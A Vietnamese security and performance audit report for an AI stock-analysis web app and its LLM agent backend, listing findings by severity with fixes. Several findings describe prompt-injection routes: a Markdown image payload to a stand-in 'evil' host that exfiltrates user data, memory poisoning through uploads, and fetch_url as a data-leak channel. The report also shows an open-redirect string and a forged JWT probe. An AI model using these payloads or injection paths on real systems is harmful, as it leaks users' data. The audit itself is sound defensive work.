# Báo cáo audit toàn bộ codebase: security, performance, throughput, concurrency

**Dự án:** VisgniteAI / Stock_Massive
**Nhánh:** `feat/host-owned-numbers` (có nhiều thay đổi chưa commit, audit chạy trên working tree)
**Ngày:** 27/09/2026
**Mode:** comprehensive, read-only (không sửa code)
**Phạm vi:** `apps/api/src` (bỏ `stocks/`, `studies/` vì là rác `__pycache__`), `apps/web/src`, compose, Dockerfile, Caddyfile, migration

**Cách làm:** quét nhanh (secret, dependency, pattern nguy hiểm), rồi bốn luồng audit sâu song song: auth/HTTP, agent harness/LLM, concurrency/performance backend, frontend. Các phát hiện trùng nhau đã được gộp theo nguyên nhân gốc. Nhiều phát hiện được xác minh trực tiếp trên stack dev đang chạy hoặc bằng script đo; chỗ nào chỉ suy luận thì có ghi rõ.

## Kết luận

Không có IDOR: route nào cũng lấy quyền sở hữu từ user đã đăng nhập. SSRF guard, budget ledger (khoá advisory, reserve worst-case), phạm vi memory theo user, CSRF và cách lưu token đều vững.

Rủi ro thật tập trung ở bốn chỗ:

1. **Next.js 15.5.21 dính hai CVE Critical** (RCE qua Image Optimization API). Đây là việc phải làm ngay.
2. **Cấu hình deploy**: prod mở thẳng cổng 8000 và 3000, rate limiter tin `X-Forwarded-For`, prod mặc định không có Redis nên không có rate limit, còn compose đặt các trần LLM theo user về 0 (tức là không giới hạn).
3. **Rò dữ liệu qua ảnh Markdown**: một prompt injection có thể khiến trình duyệt người đọc tự gửi dữ liệu ra ngoài mà không cần bấm gì.
4. **Event loop và thread pool**: grounding chạy CPU đồng bộ trên event loop (đo được 2,15s mỗi lần), thread pool mặc định bị dùng chung nên dễ cạn, và một lần ghi trạng thái cuối thất bại sẽ để Turn kẹt mãi ở trạng thái active.

## Tổng hợp

| Nhóm | Critical | High | Medium | Low | Info |
|---|---|---|---|---|---|
| Secret | 0 | 0 | 0 | 0 | 0 |
| Dependency | 2 | 2 | 2 | 0 | 0 |
| Deploy / Auth / HTTP | 0 | 3 | 6 | 9 | 0 |
| Agent / LLM | 0 | 1 | 3 | 6 | 2 |
| Concurrency / Performance | 0 | 3 | 6 | 7 | 0 |
| Frontend | 0 | 1 | 4 | 6 | 1 |

(Đã gộp trùng: ảnh Markdown, rate limit dồn một IP sau Next, upload chunked, security header, open redirect, thread pool, Redis đồng bộ, danh sách không phân trang.)

## Quét nhanh

- **`.env`:** không có file `.env` nào được track, và lịch sử git cũng chưa từng thêm. `.gitignore` đã có `.env`, `.env.local`, `.env.*.local`, `.env.bak*`.
- **Secret:** không có secret thật. Chuỗi dạng key chỉ xuất hiện trong fixture test (`test_agent_security_adversarial.py`, `test_llm_error_taxonomy.py`, `test_agent_persistence_paths.py`), và đều là giá trị giả có chủ đích.
- **Dependency Python:** `pip-audit` trên 75 gói đang cài trong container api không tìm thấy lỗ hổng nào. `vnstock`/`vnai` không có trên PyPI nên không audit được. Cần lưu ý `requirements.txt` chỉ ghi khoảng phiên bản, không có lockfile, nên bản build prod có thể lấy phiên bản khác bản vừa audit.
- **Dependency web (`pnpm audit`):**

| Mức | Gói | Hiện tại → bản vá | Ghi chú |
|---|---|---|---|
| Critical | next | 15.5.21 → ≥15.5.24 | RCE không cần đăng nhập qua Image Optimization API (AVIF) |
| Critical | next | 15.5.21 → ≥15.5.24 | RCE trên server chạy Windows (không áp dụng cho Docker Linux, nhưng cùng một bản vá) |
| High | sharp | 0.35.3 → ≥0.35.4 | lỗi trong libheif, đi kèm next |
| High | js-yaml | 4.3.1 → ≥4.3.2 | CPU DoS, chỉ nằm trong toolchain eslint |
| Moderate | vitest, @vitest/mocker | 4.1.10 → ≥4.1.11 | chỉ dùng khi dev/test |

`/_next/image` đi được từ internet: Caddy proxy toàn bộ tới web:3000, còn `middleware.ts:61` loại trừ route này khỏi kiểm tra auth. App không dùng `next/image`, nên ngoài việc nâng bản Next, có thể đặt thêm `images: { unoptimized: true }` để tắt hẳn endpoint này.

## Phát hiện

### Critical

| # | Nhóm | File:Line | Mô tả | Cách sửa |
|---|---|---|---|---|
| C1 | Dependency | `apps/web/package.json:27` | Next 15.5.21 có RCE không cần đăng nhập qua `/_next/image`, và route này công khai | Nâng `next` lên ≥15.5.24, override `sharp` ≥0.35.4, đặt `images.unoptimized: true` |

### High

| # | Nhóm | File:Line | Mô tả | Cách sửa |
|---|---|---|---|---|
| H1 | Deploy / A07 | `docker-compose.prod.yml:138-139,164-165`; `core/ratelimit.py:96-106` | Prod mở thẳng `8000:8000` và `3000:3000`, bỏ qua Caddy và TLS. Limiter lấy IP đầu tiên trong `X-Forwarded-For` mà không kiểm tra nguồn. **Đã xác minh:** 25/25 lần login với XFF thay đổi liên tục đều không bị 429 | Dùng `expose` thay cho `ports`; chạy uvicorn với `--forwarded-allow-ips=<caddy>` và lấy key từ `request.client.host` |
| H2 | Deploy / A04 | `docker-compose.prod.yml:63`; `core/ratelimit.py:72-75,164-166`; `agent/limits.py:80-82,114-116` | Compose prod không có Redis và `CACHE_REDIS_URL` rỗng, nên rate limit tắt hẳn. Khi Redis lỗi thì request vẫn được cho qua (fail-open) | Thêm Redis vào prod; cho các endpoint đăng nhập/đổi mật khẩu fail-closed, hoặc dùng limiter trong process làm dự phòng |
| H3 | Deploy (dev) | `docker-compose.yml:18-24,39,86-87`; `core/config.py:28` | Postgres mở trên `*:5432` với mật khẩu mặc định; API chạy trên `*:8000` với `AUTH_SECRET` mặc định đã công khai. **Đã xác minh:** JWT tự ký bằng secret này gọi `/auth/me` được 200. Máy nào cùng LAN cũng đọc được DB hoặc chiếm được tài khoản bất kỳ | Bind các cổng dev vào `127.0.0.1:`; bỏ secret mặc định |
| H4 | Agent / Frontend | `apps/web/src/components/alpha/message/markdown.tsx:95-112` | Ảnh Markdown `![](https://evil/?d=...)` được render thành `<img>` thật. Chỉ cần một prompt injection từ web, PDF hoặc file tải lên là trình duyệt người đọc tự gửi dữ liệu (ghi chú, danh mục, custom instructions) ra ngoài. Các kiểm tra phía backend chỉ chạy trên tool call, không chạy trên text câu trả lời | Thêm `components.img` chỉ render alt text (hoặc `disallowedElements={["img"]}`); thêm CSP `img-src 'self' data: blob:` |
| H5 | Performance | `agent/loop.py:3441-3450,3478,3519,3544`; `evidence/grounding.py:1181-1260` | `_figure_report` là việc CPU đồng bộ, được gọi thẳng trong async tới 3 lần mỗi Turn. **Đã đo:** 8 mã × 250 phiên, câu trả lời 120 con số mất 2,15s mỗi lần, tức khoảng 6s event loop bị treo. Trong lúc đó mọi SSE, heartbeat và request khác đều đứng | `await asyncio.to_thread(self._figure_report, state)`; tính `known`/`named_symbols` một lần cho mỗi câu trả lời và đánh chỉ mục giá trị nguồn theo độ lớn |
| H6 | Concurrency | `agent/turns.py:580,596-607` | `mark_turn_running` nằm ngoài `try`, còn `_finish`/`_finish_bare` không có lớp bảo vệ. Nếu ghi trạng thái cuối lỗi (DB sập, pool timeout, thread bị xoá giữa chừng), Turn kẹt ở `running`: stream chỉ nhận heartbeat mãi, user bị 429 `user_active_turn` vĩnh viễn, và 3 Turn kẹt kiểu này làm cả hệ thống trả 503. Cách gỡ duy nhất là restart, vì sweep chỉ chạy lúc khởi động | Bọc đường kết thúc Turn: retry có backoff và luôn phát sự kiện kết thúc; thêm reaper định kỳ cho các Turn active mà không có trong `_running` |
| H7 | Concurrency / DoS | `agent/executor.py:151,731`; `tools/web.py:97,562-619`; `tools/vnstock_provider.py:150` | DB đồng bộ, tool, sleep của rate gate vnstock và web fetch đều dùng chung thread pool mặc định (`min(32, cpu+4)`). Timeout 8s chỉ tính cho từng lần đọc socket, không có hạn tổng; **đã xác minh** một server trả dữ liệu nhỏ giọt giữ `read()` sống mãi. Thread vẫn chạy sau khi `wait_for` đã bỏ nó. Vài Turn gặp provider chậm là đủ làm nghẽn checkpoint, reserve LLM và `create_turn` | Tách executor riêng, có giới hạn, cho tool mạng; thêm hạn tổng khoảng 20s trong vòng `capped_body`; giữ pool mặc định ≥ kích thước sync DB pool |

### Medium

| # | Nhóm | File:Line | Mô tả | Cách sửa |
|---|---|---|---|---|
| M1 | A04 / Cost | `docker-compose*.yml` (`LLM_USER_*:-0`, `LLM_SYSTEM_ACTIVE_TURNS:-0`); `core/llm/config.py:274-276` | Compose đặt về 0 (không giới hạn) các trần mà code mặc định là 20 Turn/ngày, 1 Turn active, $3/ngày, $15/30 ngày. Đăng ký lại mở tự do, nên tài khoản rác có thể đốt hết ngân sách tháng. **Đã xác minh** trên container dev | Bỏ các fallback `:-0` |
| M2 | A07 | `core/config.py`; `auth/security.py:61`; `.env.example:18` | Không có kiểm tra `AUTH_SECRET` lúc khởi động: chuỗi placeholder vẫn qua được `${AUTH_SECRET:?}`. JWT không bắt buộc có `exp` | Từ chối secret mặc định, placeholder, hoặc ngắn hơn 32 byte; decode với `require: ["exp","sub","type"]` |
| M3 | A07 | `auth/schemas.py:52,59,139-140`; `auth/service.py:89-91` | Schema giới hạn 72 *ký tự*, nhưng bcrypt 5 báo lỗi khi quá 72 *byte*. **Đã xác minh:** email không tồn tại cộng mật khẩu `'é'*40` trả 500, email có thật trả 401, nên lộ được email nào tồn tại. Đăng ký bằng mật khẩu tiếng Việt dài cũng trả 500 | Validator `len(v.encode()) <= 72`; nhánh dummy hash dùng hash tính sẵn và đặt trong cùng try/except |
| M4 | A04 / DoS | `apps/web/src/lib/auth/api.ts:59-67`; `app/api/alpha-desk/[...path]/route.ts:369-389` | Next không chuyển tiếp IP client, nên mọi lượt login, register và upload chung một bucket 20 lần/60s. Kẻ tấn công chưa đăng nhập chỉ cần 20 lần login sai mỗi phút là khoá đăng nhập của tất cả mọi người | Next chuyển tiếp IP nhận từ Caddy, API chỉ tin hop đó; giới hạn đăng nhập theo cả IP lẫn email |
| M5 | DoS | `agent/router.py:781-801`; `attachments.py:302`; `route.ts:224-225`; `deploy/Caddyfile` | Upload chunked (không có Content-Length) bị spool và đọc hết vào RAM trước khi kiểm tra 4 MiB; Next `arrayBuffer()` không có giới hạn; Caddy không đặt `request_body` | Caddy `request_body { max_size 5MB }`; từ chối request thiếu Content-Length hoặc đọc stream có đếm byte; giới hạn body ở Next |
| M6 | Integrity | `core/database.py:169-177` | `get_db` commit *sau khi* response đã gửi (đã xác minh thứ tự với FastAPI 0.141). `/auth/password`, rotate refresh token, `logout-all` và các lệnh xoá có thể trả 2xx rồi âm thầm rollback | Commit tường minh trong handler, hoặc dùng scope dependency chạy exit trước khi gửi response |
| M7 | Agent | `agent/executor.py:683-687`; `messages.py:1405-1460`; `permissions.py:104-110` | File tải lên được bọc như nội dung không tin cậy, nhưng không bật cờ chặn `remember_fact`. Một CSV hay ảnh chụp chứa injection có thể ghi vĩnh viễn một "sự thật" độc vào memory | Đánh dấu Turn là đã đọc nội dung không tin cậy khi `request.attachments` không rỗng, trước vòng 1 |
| M8 | Agent | `agent/security.py:44-56`; `tools/web.py:878-898` | Sau khi đọc nội dung không tin cậy, `fetch_url` (là tool READ) vẫn gọi được tới URL bất kỳ với query chứa dữ liệu người dùng, tạo thành một kênh rò ra ngoài | Sau khi Turn đã đọc nội dung không tin cậy: chỉ cho URL đã xuất hiện nguyên văn trong kết quả trước hoặc tin nhắn người dùng, hoặc bỏ query string |
| M9 | Concurrency | `core/llm/admission.py:428-489,502-519`; `persistence.py:1627-1704` | Trần số Turn active bị race kiểu kiểm tra rồi mới chèn: hai POST cùng lúc đều qua preflight, và lần reserve sau đó thấy vượt trần nên giết *cả hai* Turn (hoặc giết Turn hợp lệ đang chạy) | Trong transaction tạo Turn, khoá advisory `turn-active-user` và `turn-active-system` rồi đếm lại |
| M10 | Concurrency | `persistence.py:2068-2071`; `main.py:83` | Sweep lúc khởi động đánh dấu interrupted cho *mọi* Turn active trong DB, kể cả Turn của process khác (rolling deploy, stack 8001 dùng chung DB) | Ghi instance id hoặc heartbeat lên row, chỉ sweep các row đã cũ |
| M11 | Performance | migration `dbd106456567:179` | `agent_turn` không có index trên `status`. Mỗi lần reserve LLM đếm `status IN (...)` trong lúc giữ khoá advisory toàn hệ thống, nên chi phí tăng theo toàn bộ lịch sử. Cũng thiếu index trên hai FK `request_message_id`/`response_message_id`, nên xoá thread phải seq-scan | Partial index `WHERE status IN ('admitted','running')` và index cho hai FK. **Là thay đổi schema, cần duyệt và backup trước** |
| M12 | Performance | `agent/limits.py:78-99`; `core/ratelimit.py:37-39,127`; `core/redis.py:62,84-86` | Redis đồng bộ chạy trên event loop, không có `socket_timeout`, và khởi tạo lỗi không được cache nên lần gọi nào cũng thử kết nối lại. Redis treo thì cả event loop treo | `to_thread` hoặc `redis.asyncio`, timeout 1s, backoff sau lần khởi tạo lỗi |
| M13 | Concurrency | `core/web_lane.py:84-86,128-133` | Single-flight của web cache làm bên đến sau *thất bại* thay vì chờ, trong khi thông báo timeout lại bảo model gọi lại, nên lần gọi lại chắc chắn lỗi | Bên đến sau poll key vài giây trước khi fallback |
| M14 | Concurrency | `tools/vnstock_provider.py:93-104` | `redirect_stdout` (biến toàn cục của process) được gọi ở mọi lần đọc provider, từ nhiều thread cùng lúc, nên `sys.stdout` có thể bị kẹt trỏ vào StringIO của thread khác: print và traceback mất, buffer phình dần | Chỉ redirect ở lần import đầu tiên, có lock; nếu module đã có trong `sys.modules` thì trả về luôn |
| M15 | Frontend | `apps/web/src/hooks/use-live-turn.ts:128-143,248-257,285-303` | Stream nhận non-200 (API restart, 503, 401) thì Turn quay mãi: probe lỗi không retry, nút Dừng chờ sự kiện kết thúc trên một stream đã đóng | Probe retry có backoff tới khi Turn kết thúc; phát `settled` từ response của `cancelTurn` |
| M16 | A05 | `next.config.js`; `deploy/Caddyfile` | Không có security header nào (CSP, HSTS, X-Frame-Options, nosniff, Referrer-Policy), nên có thể bị clickjacking vào các thao tác xoá ở trang Settings | Thêm khối `header` ở Caddy, hoặc `headers()` ở Next; `poweredByHeader: false` |
| M17 | A01 | `apps/web/src/app/(auth)/actions.ts:16-21` | Open redirect sau login: `/\evil.example` qua được `safeRedirectPath`, và WHATWG URL phân giải nó thành `evil.example` (hành vi redirect của Next chưa thử trên trình duyệt) | So sánh origin bằng `new URL(next, base)`, hoặc từ chối chuỗi có `\` hay ký tự điều khiển |
| M18 | Frontend | `components/shell/desk-state.tsx:678-728` | Live Turn không gắn với Thread đang mở: mở Thread Y rồi bấm Dừng thì huỷ Turn của X; `newThread` quên Turn đang chạy, còn cache của X có `staleTime: Infinity` nên mở lại X không thấy câu trả lời | Chỉ cho `canCancel`/busy khi `live.threadId === threadId`; invalidate `thread(X)` trước khi reset |
| M19 | Frontend | `use-live-turn.ts:205-224` | Idempotency key không được dùng lại: POST đã commit nhưng mất response, người dùng gửi lại thì sinh Turn thứ hai và tốn tiền hai lần | Retry với cùng `id`, hoặc gọi `fetchTurn(id)` để gắn vào Turn đã có |
| M20 | Frontend perf | `desk-state.tsx:565-585,724-791`; `sidebar.tsx:297`; `view-chat.tsx:395` | Mỗi sự kiện SSE và mỗi lần commit 55ms đổi context value, làm re-render toàn shell khoảng 18 lần/giây, gồm mọi `SidebarRow` (danh sách thread không giới hạn) | Tách context thành phần ổn định và phần streaming; `memo` cho `SidebarRow` và tin nhắn lịch sử |
| M21 | Frontend | `components/providers/connection-gate.tsx`; `lib/api.ts:6` | Health probe gọi thẳng từ trình duyệt tới `NEXT_PUBLIC_API_URL`, trái với thiết kế proxy cùng origin. Nếu biến này không được đặt lúc build, trình duyệt sẽ probe `localhost:8000` trên máy người dùng | Probe qua route cùng origin (`app/api/health`) |

### Low

| # | File:Line | Mô tả |
|---|---|---|
| L1 | `agent/router.py:693-706` | `GET /capabilities` không cần đăng nhập, trái với docstring (đã xác minh 200) |
| L2 | `main.py:93-98` | `/docs` và `/openapi.json` công khai; nên tắt ở prod |
| L3 | `attachments.py:242,273,277` | Tên file tiếng Việt làm download trả 500 (`UnicodeEncodeError` latin-1); dùng `filename*=UTF-8''` |
| L4 | `persistence.py:1628-1662` | `retry_of_turn_id` không kiểm tra quyền sở hữu; va chạm `turn_id` với user khác thì retry 20 lần rồi trả 500 (lộ việc id có tồn tại) |
| L5 | `auth/service.py:129-153` | Rotate refresh token bị race (hai request dùng cùng token đều sinh token mới); `/auth/refresh` không có rate limit; bảng `refresh_tokens` không bao giờ dọn |
| L6 | `auth/service.py:70-79` | Hai lượt đăng ký cùng email cùng lúc gây `IntegrityError` và trả 500 |
| L7 | `persistence.py:772-788,813-817` | `GET /threads` và danh sách tin nhắn không phân trang; id kiểu int quá lớn gây 500 |
| L8 | `tools/memory.py:143,239-275` | `session_search` trả cả trích đoạn assistant nhưng được coi là tin cậy, nên injection có thể đi từ Turn này sang Turn sau |
| L9 | `untrusted.py:95-101` | Bước vô hiệu hoá thẻ chỉ xử lý thẻ `untrusted_tool_result`, trang web vẫn giả được `<user_attachment>` |
| L10 | `tools/web.py:519-521` | `is_global` nhận NAT64 `64:ff9b::/96`, 6to4 `2002::/16`, `::/96` là địa chỉ public; chỉ gây rủi ro nếu host có IPv6/NAT64 |
| L11 | `attachments.py:355-389` | Kiểm tra quota upload bị race kiểu đếm rồi mới chèn (vượt được 200 file / 200 MB) |
| L12 | `core/web_lane.py:88-89` | Log `str(exc)` không cắt ngắn, attacker chèn được tới 64 KB kèm CRLF vào log |
| L13 | `vnstock_provider.py:66,152,218-223` | Quota vnstock dùng chung toàn hệ thống, không chia công bằng theo user; `cached()` không có single-flight nên các lượt miss đồng thời cùng tốn quota |
| L14 | `turns.py:631-636`; `compaction.py:384` | Compaction không có guard cho từng thread nên có thể tóm tắt hai lần cùng lúc |
| L15 | `use-live-turn.ts:140`; `live-turn.ts:234` | Action `settled` không mang `turnId`, nên một probe chậm có thể kết thúc nhầm Turn mới |
| L16 | `settings/memory-section.tsx:79` | `href={fact.source_url}` không qua `safeHref` (backend đã chặn scheme; đây là lớp phòng thủ thêm) |
| L17 | `answer-sources.ts`; `sources-tab.tsx:62-66` | Nhãn nguồn lấy từ text câu trả lời nên giả được ("Vietcap —" mà link trỏ sang domain lạ); nên hiện hostname |
| L18 | `route.ts:369` | Fetch upstream không truyền `signal: request.signal`, có thể giữ kết nối SSE sau khi client ngắt (chưa xác minh lúc chạy) |
| L19 | `desk-state.tsx:503-546`; `use-threads.ts:~200-285` | Câu hỏi đầu tiên có thể vào nhầm thread khi `createThread` còn đang chờ; mutation flag/helpful ghi vào cache của thread hiện tại chứ không phải thread gốc |
| L20 | `apps/api/Dockerfile` | Image dev chạy bằng root (image prod đã non-root) |

### Info

- Compaction dùng `ANALYSIS_RUN` với uuid mới mỗi lần, nên không bị tính vào trần chi phí theo user (vẫn nằm trong envelope của lane).
- `session_search` vẫn chạy khi user đã tắt memory.
- Header `X-Powered-By: Next.js` vẫn bật.

### Rủi ro tiềm ẩn nếu chạy nhiều worker

Hiện chỉ có `--workers 1` trong `Dockerfile.prod` đảm bảo chạy một worker; lúc chạy không có gì kiểm tra điều này. Nếu có nhiều worker thì: cancel không hoạt động giữa các worker (loop không đọc `cancel_requested_at`), subscribe qua worker khác sẽ lặp reconnect, còn `SessionSlots`, rate gate vnstock (kèm rủi ro `sys.exit`), memo cache và `_running` đều nhân lên theo số worker.

### Trần throughput (theo thứ tự bão hoà)

1. 3 slot Turn active cho toàn hệ thống, 1 slot mỗi user. Deadline lane là 1 giờ, nên 3 Turn dài có thể chiếm dịch vụ tới 1 giờ.
2. Rate gate vnstock 16 request/phút.
3. Thread pool mặc định (H7).
4. CPU event loop do grounding (H5).

DB pool (15 async + 15 sync) không phải chỗ nghẽn đầu tiên.

## Đã kiểm tra và loại trừ

- **IDOR:** thread, turn, SSE, cancel, attachment, question, flag, memory và usage đều lọc theo owner trong SQL.
- **SSRF:** chỉ cho http/https; mọi địa chỉ resolve ra phải `is_global`; chặn được DNS rebinding bằng cách kết nối tới IP đã ghim; kiểm tra lại mỗi redirect (tối đa 4); không có gzip bomb.
- **Budget:** khoá advisory theo thứ tự cố định và reserve worst-case trong cùng transaction, nên không vượt trần *chi phí* (M9 là chuyện trần *số lượng* Turn).
- **Auth:** bcrypt + `gensalt`; refresh token là `token_urlsafe(48)` lưu dạng SHA-256, dùng lại thì bị revoke toàn bộ; JWT dùng danh sách thuật toán cố định và `type=access`; cookie httpOnly, SameSite=Lax, Secure ở prod; proxy kiểm tra Origin để chống CSRF; allowlist của proxy chặn được path traversal (đã thử `%2e%2e`, `..%2f`).
- **XSS:** không có `rehype-raw`; link `javascript:` bị biến thành `href=""`; source list chỉ nhận http/https và có `rel=noopener noreferrer nofollow`.
- **Injection / deserialization:** các `text()` dùng tham số bind; không có pickle hay `yaml.load`; calculator dùng `Decimal`, không eval; regex trong `threat_patterns` chỉ dùng quantifier có giới hạn.
- **Task / leak:** task của Turn và compaction đều được giữ tham chiếu; subscriber được đóng trong `finally`; heartbeat 15s; DB session ngắn, không giữ kết nối trong lúc chờ LLM.
- **LLM gateway:** log được redact; error body bị cắt ngắn; không có `verify=False`.
- **Image prod:** chạy non-root; `.dockerignore` loại `.env*`; DB prod không mở cổng.

## Thứ tự sửa đề xuất

1. **Ngay:** C1 (nâng Next và sharp), H1 và H2 (đóng cổng 8000/3000, tin XFF chỉ từ Caddy, có Redis ở prod), M1 (bỏ `:-0` của trần LLM), H4 (chặn ảnh Markdown và thêm CSP).
2. **Sprint này:** H5 (grounding ra thread), H6 (đường kết thúc Turn cùng reaper), H7 (executor riêng và hạn tổng khi fetch), M7 (file tải lên bật cờ chặn `remember_fact`), M3 (bcrypt 72 byte), M4/M5 (IP qua Next, giới hạn body), M6 (commit trước khi gửi response), M9 (khoá khi tạo Turn).
3. **Sprint sau:** phần Medium còn lại. M11 là thay đổi schema, cần duyệt và backup trước.
4. **Backlog:** phần Low.
5. **Máy dev (H3):** bind cổng vào `127.0.0.1` ngay nếu máy nằm trong LAN dùng chung.

## Ghi chú

- Luồng audit auth đã tự ghi một file memory riêng tại `.claude/agent-memory/code-reviewer/`; ngoài ra không file nào trong repo bị sửa.
- Các probe chạy trực tiếp (login với XFF, JWT tự ký, bcrypt) đều chạy trên stack dev, không chạm tới prod.

## Câu hỏi còn mở

1. Prod có cần công khai `API_DOMAIN`/cổng 8000 không? Token là httpOnly nên trình duyệt không gửi bearer trực tiếp được; mở cổng chỉ làm rộng bề mặt tấn công. Câu trả lời quyết định mức độ của H1 và M21.
2. Có chủ đích để đăng ký tự do ở prod không? Câu trả lời quyết định mức độ của M1.
3. Prod dùng Upstash hay Redis cục bộ? (Quyết định M12 là Medium hay High.)
4. Có định rolling deploy kiểu start trước, stop sau không? (Quyết định độ gấp của M10.)
5. Deadline lane 1 giờ với chỉ 3 slot hệ thống có phải cố ý không?
6. "Mỗi user chỉ một Turn trên mọi Thread" có phải cố ý không? (Quyết định cách sửa M18.)
